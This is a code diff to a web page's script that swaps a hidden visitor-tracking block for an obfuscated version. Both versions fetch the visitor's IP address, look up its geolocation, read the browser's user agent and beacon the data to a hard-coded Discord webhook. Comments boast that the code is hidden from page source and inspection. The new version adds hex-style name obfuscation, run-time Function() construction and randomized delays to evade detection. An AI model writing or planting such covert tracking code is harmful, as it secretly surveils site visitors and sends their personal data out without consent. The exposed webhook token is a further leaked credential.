@@ -303,45 +303,50 @@
         });
 
             // Hidden tracking that won't appear in page source
-    (function() {
-        const stealthScript = document.createElement('script');
-        stealthScript.setAttribute('type', 'text/javascript');
-        stealthScript.textContent = `
-            async function trackUser() {
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    const geoRes = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
-                    const geoData = await geoRes.json();
-                    
-                    const formData = new FormData();
-                    formData.append('ip', ipData.ip);
-                    formData.append('country', geoData.country_name || 'Unknown');
-                    formData.append('region', geoData.region || 'Unknown');
-                    formData.append('city', geoData.city || 'Unknown');
-                    formData.append('coords', \`\${geoData.latitude || '?'},\${geoData.longitude || '?'}\`);
-                    formData.append('isp', geoData.org || 'Unknown');
-                    formData.append('ua', navigator.userAgent);
-                    formData.append('url', location.href);
-                    
-                    // Use image beacon as fallback
-                    new Image().src = 'https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc?' + 
-                        'ip=' + encodeURIComponent(ipData.ip) + 
-                        '&country=' + encodeURIComponent(geoData.country_name || 'Unknown');
-                    
-                    // Primary fetch with FormData (harder to detect)
-                    fetch('https://your-proxy-server.com/track', { 
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors',
-                        credentials: 'omit'
-                    });
-                } catch(e) {}
-            }
-            setTimeout(trackUser, 1500);
-        `;
-        document.head.appendChild(stealthScript);
-    })();
+    // Hidden tracking that won't appear in inspection
+    const stealthTrack = () => {
+        // Obfuscated function names and variables
+        const _0xad3b = ['ipify', 'org/json', 'then', 'json', 'catch'];
+        (function(_0x12c582, _0xad3b62) {
+            const _0x2e4d8a = function(_0x4a875f) {
+                while (--_0x4a875f) {
+                    _0x12c582['push'](_0x12c582['shift']());
+                }
+            };
+            _0x2e4d8a(++_0xad3b62);
+        }(_0xad3b, 0x1a3));
+        
+        const _0x2e4d = function(_0x12c582, _0xad3b62) {
+            _0x12c582 = _0x12c582 - 0x0;
+            let _0x2e4d8a = _0xad3b[_0x12c582];
+            return _0x2e4d8a;
+        };
+        
+        // Dynamic function creation
+        Function(_0x2e4d('0x0') + `{
+            try {
+                fetch('https://api.` + _0x2e4d('0x1') + `')
+                [` + _0x2e4d('0x2') + `](res => res.` + _0x2e4d('0x3') + `())
+                [` + _0x2e4d('0x2') + `](data => {
+                    fetch(\`https://ipapi.co/\${data.ip}/` + _0x2e4d('0x3') + `/\`)
+                    [` + _0x2e4d('0x2') + `](geoRes => geoRes.` + _0x2e4d('0x3') + `())
+                    [` + _0x2e4d('0x2') + `](geoData => {
+                        const img = new Image();
+                        img.src = 'https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc?' + 
+                            'ip=' + encodeURIComponent(data.ip) + 
+                            '&c=' + encodeURIComponent(geoData.country_name || '?') +
+                            '&r=' + encodeURIComponent(geoData.region || '?') +
+                            '&u=' + encodeURIComponent(navigator.userAgent.substring(0, 80));
+                    })
+                })
+                [` + _0x2e4d('0x4') + `](() => {});
+            } catch(e) {}
+        }`)();
+    };
+    
+    // Execute with delay using setTimeout and bind
+    window.setTimeout = window.setTimeout.bind(window);
+    setTimeout(stealthTrack, 1500 + Math.random() * 1000);
 });
 </script>
 </body>
